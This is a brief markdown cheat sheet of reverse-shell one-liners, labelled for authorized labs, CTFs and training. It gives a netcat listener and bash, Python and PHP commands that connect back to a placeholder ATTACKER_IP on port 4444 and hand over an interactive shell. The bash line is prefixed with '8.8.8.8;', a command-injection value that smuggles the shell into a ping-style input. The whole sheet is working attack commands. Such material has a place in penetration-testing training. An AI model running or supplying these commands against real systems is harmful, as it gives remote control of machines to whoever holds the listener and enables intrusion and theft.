\# Reverse Shell Notes



For authorized labs, CTFs, and training environments only.



\## Netcat listener



```bash

nc -lvnp 4444



\## Bash

8.8.8.8;bash -c 'bash -i >\& /dev/tcp/ATTACKER\_IP/4444 0>\&1'



\## Python

python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER\_IP",4444));\[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'



\## PHP

php -r '$sock=fsockopen("ATTACKER\_IP",4444);exec("/bin/sh -i <\&3 >\&3 2>\&3");'

